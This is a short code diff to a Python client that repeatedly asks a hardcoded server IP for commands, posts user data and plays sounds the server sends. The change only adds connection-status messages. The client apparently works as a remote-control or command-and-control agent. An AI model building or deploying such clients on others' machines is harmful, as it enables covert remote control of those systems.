@@ -18,9 +18,11 @@ IP = "139.177.176.121"
 PORT = 80
 SCHEME = "http"
 CONNECT_TIMEOUT = 5
+connected: bool = False
 
 
 def main() -> None:
+    global connected
     try:
         while True:
             get_commands_response = get(
@@ -80,9 +82,16 @@ def main() -> None:
                 post_user()
             if get_playsound_response.status_code == 200:
                 Thread(target=play_sound_thread, args=[get_playsound_response.content])
+
+            if not connected:
+                print("Connected.")
+                connected = True
+            else:
+                print("Asked server for actions.")
             sleep(DELAY)
     except RequestException:
         print("Failed to connect, retrying...")
+        connected = False
         main()
     except KeyboardInterrupt:
         print("Goodbye...")
